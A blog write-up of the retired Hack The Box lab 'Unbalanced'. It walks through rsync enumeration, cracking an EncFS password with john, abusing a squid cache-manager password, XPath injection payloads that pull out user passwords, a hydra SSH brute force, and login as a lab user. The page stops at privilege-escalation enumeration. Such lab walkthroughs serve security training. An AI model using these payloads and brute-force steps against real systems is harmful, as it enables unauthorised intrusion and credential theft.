<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox - Unbalanced" /><meta property="og:locale" content="en" /><meta name="description" content="Just another hackthebox writeups website powered by poorduck" /><meta property="og:description" content="Just another hackthebox writeups website powered by poorduck" /><link rel="canonical" href="https://x00tex.github.io/posts/unbalanced/" /><meta property="og:url" content="https://x00tex.github.io/posts/unbalanced/" /><meta property="og:site_name" content="Poorduck" /><meta property="og:image" content="https://x00tex.github.io/assets/img/posts/unbalanced/unbalanced_banner.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-23T18:30:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://x00tex.github.io/assets/img/posts/unbalanced/unbalanced_banner.png" /><meta property="twitter:title" content="Hackthebox - Unbalanced" /><meta name="twitter:site" content="@p00rduck" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-16T12:39:32+00:00","datePublished":"2020-11-23T18:30:00+00:00","description":"Just another hackthebox writeups website powered by poorduck","headline":"Hackthebox - Unbalanced","image":"https://x00tex.github.io/assets/img/posts/unbalanced/unbalanced_banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://x00tex.github.io/posts/unbalanced/"},"url":"https://x00tex.github.io/posts/unbalanced/"}</script><title>Hackthebox - Unbalanced | Poorduck</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Poorduck"><meta name="application-name" content="Poorduck"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/poorduck.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Poorduck</a></div><div class="site-subtitle font-italic">Kwak kwak</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/x00tex" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/p00rduck" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['x00tex-writeups.3us6n','simplelogin.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox - Unbalanced</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - Unbalanced</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/p00rduck">p00rduck</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1606156200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-11-23 </em> </span> <span> Updated <em class="timeago" data-ts="1652704772" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-16 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2362 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/posts/unbalanced/unbalanced_banner.png" alt="" data-proofer-ignore></p><p align="right"> <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" data-src="https://www.hackthebox.eu/badge/image/391067" data-proofer-ignore></a></p><h1 id="scanning">Scanning</h1><h2 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><code class="language-plaintext highlighter-rouge">ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.200 | grep open | awk -F / '{print $1}' ORS=',') echo $ports &amp;&amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.200</code></p><div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="p">PORT     STATE SERVICE    VERSION
</span><span class="gi">+22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+873/tcp  open  rsync      (protocol version 31)
+3128/tcp open  http-proxy Squid http proxy 4.6
</span><span class="err">|_http-server-header:</span> squid/4.6
<span class="err">|_http-title:</span> ERROR: The requested URL could not be retrieved
</pre></table></code></div></div><p><strong>Squid http proxy :</strong> Squid is a caching and forwarding HTTP web proxy. It has a wide variety of uses, including speeding up a web server by caching repeated requests, caching web, DNS and other computer network lookups for a group of people sharing network resources, and aiding security by filtering traffic.</p><ul><li>add this proxy in <code class="language-plaintext highlighter-rouge">foxyproxy</code></ul><p><strong>goto :</strong> <code class="language-plaintext highlighter-rouge">http://10.10.10.200</code></p><p><strong>Error :</strong> Access Denied.</p><ul><li>i don’t have any host that is allowed from the proxy so i can not get much information from here for now.</ul><h2 id="rsync"><span class="mr-2">rsync</span><a href="#rsync" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files. It is commonly found on Unix-like operating systems. Rsync is written in C as a single threaded application.</p><h3 id="rsync-enumeration"><span class="mr-2">rsync Enumeration</span><a href="#rsync-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li><p>list all directories -</p><p><code class="language-plaintext highlighter-rouge">rsync 10.10.10.200::</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>conf_backups    EncFS-encrypted configuration backups
</pre></table></code></div></div><li><p>copy <code class="language-plaintext highlighter-rouge">conf_backups</code> in local machine -</p><p><code class="language-plaintext highlighter-rouge">rsync -av 10.10.10.200::conf_backups conf_backups</code></p><li><p>inside conf_backups directory</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>❯ tree -a conf_backups
conf_backups
├── 0K72OfkNRRx3-f0Y6eQKwnjn
&lt;snippet&gt;
└── ZXUUpn9SCTerl0dinZQYwxrx

0 directories, 75 files
</pre></table></code></div></div><p><strong>folder is EncFS-encrypted of system configuration files backup.</strong></p></ul><p><strong>EncFS :</strong> EncFS is a Free (LGPL) FUSE-based cryptographic filesystem. It transparently encrypts files, using an arbitrary directory as storage for the encrypted files. … Files are encrypted using a volume key, which is stored either within or outside the encrypted source directory. A password is used to decrypt this key.</p><ul><li><p>in EncFS encryption all file name change into random text and create <code class="language-plaintext highlighter-rouge">.encfs6.xml</code> file that contains metadata of the encryption.</p><li><p>searching on google i find out that johntheripper has a python script that extract password hash from <code class="language-plaintext highlighter-rouge">.encfs6.xml</code> file.</p></ul><h3 id="cracking-encfs-encrypted-conf_backups-folder"><span class="mr-2">cracking EncFS-encrypted conf_backups Folder</span><a href="#cracking-encfs-encrypted-conf_backups-folder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li><p>use encfs2john.py to extract hash</p><p><code class="language-plaintext highlighter-rouge">python3 /usr/share/john/encfs2john.py dump/conf_backups</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>dump/conf_backups:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
</pre></table></code></div></div><li><p>crack hash using john</p><p><code class="language-plaintext highlighter-rouge">john -w=/usr/share/wordlists/rockyou.txt encfs_hash</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])

bubblegum        (conf_backups)

Session completed
</pre></table></code></div></div><p><strong>Found Password :</strong> <code class="language-plaintext highlighter-rouge">bubblegum</code></p><li><p>decrypt conf_backups require <a href="https://github.com/vgough/encfs">encfs</a> tool’s <strong>encfsctl</strong> utility which decrypt encfs filesystem.</p><p><code class="language-plaintext highlighter-rouge">encfsctl export conf_backups encfs_decrypt</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>EncFS Password:	bubblegum
</pre></table></code></div></div></ul><div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="err">❯</span> tree -a encfs_decrypt
<span class="p">encfs_decrypt
</span><span class="err">├──</span> 50-localauthority.conf
<span class="gd">&lt;snippet&gt;
</span><span class="gi">+── squid.conf
</span><span class="gd">&lt;snippet&gt;
</span><span class="err">└──</span> xattr.conf

0 directories, 74 files
</pre></table></code></div></div><h2 id="squid"><span class="mr-2">squid</span><a href="#squid" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="squid-proxy"><span class="mr-2">squid-proxy</span><a href="#squid-proxy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><em>from the decrypted config files grep for <code class="language-plaintext highlighter-rouge">htb</code></em></p><p><code class="language-plaintext highlighter-rouge">grep -r htb</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>squid.conf:acl intranet dstdomain -n intranet.unbalanced.htb
</pre></table></code></div></div><p><strong>Internal Host :</strong> intranet.unbalanced.htb</p><ul><li>Host is found in <code class="language-plaintext highlighter-rouge">squid.conf</code> and then i rewind that there a Squid http proxy service running on port 873 in the box.<li>i already add proxy in my browser and now found a host that can accessible from the proxy.<ul><li>i can access to <code class="language-plaintext highlighter-rouge">intranet.unbalanced.htb</code> from <code class="language-plaintext highlighter-rouge">squid-proxy</code> i set in the foxyproxy, but i don’t find anything interesting in host web page.</ul></ul><h3 id="squidcachemanager"><span class="mr-2"><a href="https://wiki.squid-cache.org/Features/CacheManager"><span class="mr-2">squid:CacheManager</a></span><a href="#squidcachemanager" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><em>From the decrypted config files grep for <code class="language-plaintext highlighter-rouge">passwd</code></em></p><p><code class="language-plaintext highlighter-rouge">grep -r passwd</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>squid.conf:cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
</pre></table></code></div></div><ul><li><p>found a <code class="language-plaintext highlighter-rouge">cachemgr_passwd</code> string in squid config file, reading the <a href="http://www.squid-cache.org/Doc/config/">squid config documents</a> i found out that there are 2 part in the <code class="language-plaintext highlighter-rouge">cachemgr_passwd</code> string from <a href="http://www.squid-cache.org/Doc/config/cachemgr_passwd/">this doc</a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Usage: cachemgr_passwd password action action ...
</pre></table></code></div></div><li>in the squid config file <code class="language-plaintext highlighter-rouge">cachemgr_passwd</code> Specify passwords for cachemgr operations.<li><p><code class="language-plaintext highlighter-rouge">cachemgr_passwd</code> has tow part in it <strong>First</strong> is <em>Password</em> and <strong>second</strong> is <em>action</em> that are allowed on that passwd</p><li>in this squid config file<ul><li><strong>First :</strong> passwd: <code class="language-plaintext highlighter-rouge">Thah$Sh1</code><li><strong>Second :</strong> actiions: <code class="language-plaintext highlighter-rouge">menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events</code></ul><li>in <a href="https://wiki.squid-cache.org/Features/CacheManager">CacheManager</a> documentation i found a tool <a href="https://wiki.squid-cache.org/SquidClientTool">squidclient</a><strong>:</strong> <em>A command line utility for performing web requests. It also has a special ability to send cache manager requests to Squid proxies.</em></ul><h1 id="user-exploit">User Exploit</h1><h2 id="squidclient"><span class="mr-2"><a href="https://linux.die.net/man/1/squidclient"><span class="mr-2">squidclient</a></span><a href="#squidclient" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>from all specified actions in the config file i found some useful actions, <a href="https://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/">here</a> is a good blog on CacheManager actions.</ul><p><strong>Action :</strong> <strong><a href="https://wiki.squid-cache.org/Features/CacheManager/FqdnCache">fqdncache</a> :</strong> This is a report of the Squid DNS cache for IP address resolution. this is same as iptable.</p><p><code class="language-plaintext highlighter-rouge">squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:fqdncache</code></p><div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>    HTTP/1.1 200 OK
    Server: squid/4.6
    Mime-Version: 1.0
    Date: Sat, 21 Nov 2020 04:52:08 GMT
    Content-Type: text/plain;charset=utf-8
    Expires: Sat, 21 Nov 2020 04:52:08 GMT
    Last-Modified: Sat, 21 Nov 2020 04:52:08 GMT
    X-Cache: MISS from unbalanced
    X-Cache-Lookup: MISS from unbalanced:3128
    Via: 1.1 unbalanced (squid/4.6)
    Connection: close

    FQDN Cache Statistics:
    FQDNcache Entries In Use: 11
    FQDNcache Entries Cached: 10
    FQDNcache Requests: 19292
    FQDNcache Hits: 0
    FQDNcache Negative Hits: 8790
    FQDNcache Misses: 10502
    FQDN Cache Contents:

    Address                                       Flg TTL Cnt Hostnames
    10.10.14.3                                     N  -36278   0
    127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
    ::1                                             H -001   3 localhost ip6-localhost ip6-loopback
<span class="gi">+   172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
+   172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
</span>    127.0.0.1                                       H -001   1 localhost
<span class="gi">+   172.17.0.1                                      H -001   1 intranet.unbalanced.htb
</span>    ff02::1                                         H -001   1 ip6-allnodes
    ff02::2                                         H -001   1 ip6-allrouters
    10.10.15.75                                    N  -47928   0
</pre></table></code></div></div><ul><li><p>Found 3 working Host IPs -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>172.31.179.2
172.31.179.3
172.17.0.1
</pre></table></code></div></div><p>but these IPs goes on same place (<code class="language-plaintext highlighter-rouge">/intranet.php</code>) where <code class="language-plaintext highlighter-rouge">intranet.unbalanced.htb</code> goes that i found before.</p><li>All hosts have same login page with username and passworrd field.<li>I try diffrent types of injection.<li><p>I create a simple burp intruder list of diffrent injections from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a> but none of them worked on any of these hosts.</p><p><strong><em>for intercepting internal Hosts request i set squid proxy <code class="language-plaintext highlighter-rouge">http://10.10.10.200:3128</code> as <a href="https://portswigger.net/support/burp-suite-upstream-proxy-servers">upstream proxy</a> in burpSuite</em></strong></p><li><p>eventually i try for 172.31.179.1 and this give an error -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Host temporarily taken out of load balancing for security maintenance.
</pre></table></code></div></div><ul><li>i tried <code class="language-plaintext highlighter-rouge">172.31.179.1/intranet.php</code> as all Hosts redirected here and i got that same login page.</ul><li>again, i run my intruder list and this time i found a working injection in the password field.</ul><h2 id="xpath-injection-1-2"><span class="mr-2">XPATH injection <a href="https://portswigger.net/kb/issues/00100600_xpath-injection"><span class="mr-2">1</a> <a href="https://owasp.org/www-community/attacks/XPATH_Injection"><span class="mr-2">2</a></span><a href="#xpath-injection-1-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>Passowrd field is vulnerable for xpath injection</strong></p><p><strong>XPathi Payload</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>' or '1'='1
</pre></table></code></div></div><ul><li><p>get some employees details</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>rita
Rita Fubelli
rita@unbalanced.htb
Role: HR Manager

jim
Jim Mickelson
jim@unbalanced.htb
Role: Web Designer

bryan
Bryan Angstrom
bryan@unbalanced.htb
Role: System Administrator

sarah
Sarah Goodman
sarah@unbalanced.htb
Role: Team Leader
</pre></table></code></div></div><li><p>after some time on brupSuite testing XPath injection i found a way to extract password strings using xpath injection like sqli.</p><p><strong>Payload :</strong> <code class="language-plaintext highlighter-rouge">' or Username='bryan'and substring(Password,$i,1)='$c</code></p><li><p>i create a bruteforce <a href="https://github.com/x00tex/hackTheBox/blob/main/Boxes/linux/Retired/unbalanced/exploits/xpath_bf.py">script</a> that extract password from database using XPath vulnerability. <strong>payload is worked like a sql boolean based injection.</strong> when <code class="language-plaintext highlighter-rouge">$i=$c</code> then page return <code class="language-plaintext highlighter-rouge">Username</code> contact details, and if <code class="language-plaintext highlighter-rouge">$i!=$c</code> then page return <code class="language-plaintext highlighter-rouge">Invalid credentials.</code><em>where <strong>i</strong> is a int and <strong>c</strong> is a char</em></p><ul><li>it takes some time to extract all password form the database</ul></ul><p><strong>creds</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>rita:password01!
jim:stairwaytoheaven
bryan:ireallyl0vebubblegum!!!
sarah:sarah4evah
</pre></table></code></div></div><h2 id="ssh-bruteforce"><span class="mr-2">ssh bruteforce</span><a href="#ssh-bruteforce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><code class="language-plaintext highlighter-rouge">hydra -L usernames -P password 10.10.10.200 -t 4 ssh</code></p><div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> [DATA] attacking ssh://10.10.10.200:22/
<span class="gi">+[22][ssh] host: 10.10.10.200   login: bryan   password: ireallyl0vebubblegum!!!
</span> 1 of 1 target successfully completed, 1 valid password found
</pre></table></code></div></div><p><strong>ssh-creds :</strong> <code class="language-plaintext highlighter-rouge">bryan:ireallyl0vebubblegum!!!</code></p><h2 id="userbryan-shell"><span class="mr-2">USER:bryan shell</span><a href="#userbryan-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><code class="language-plaintext highlighter-rouge">ssh bryan@10.10.10.200</code></p><div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gi">+bryan@10.10.10.200's password: ireallyl0vebubblegum!!!
</span>
Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

bryan@unbalanced:~$ cat user.txt
<span class="p">f91a0994************************
</span></pre></table></code></div></div><h1 id="privesc-enumeration">Privesc enumeration</h1><ul><li><p>in the bryan home folder there is a <code class="language-plaintext highlighter-rouge">TODO</code> file and inside the file there is a service specified that is running on localhost -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]
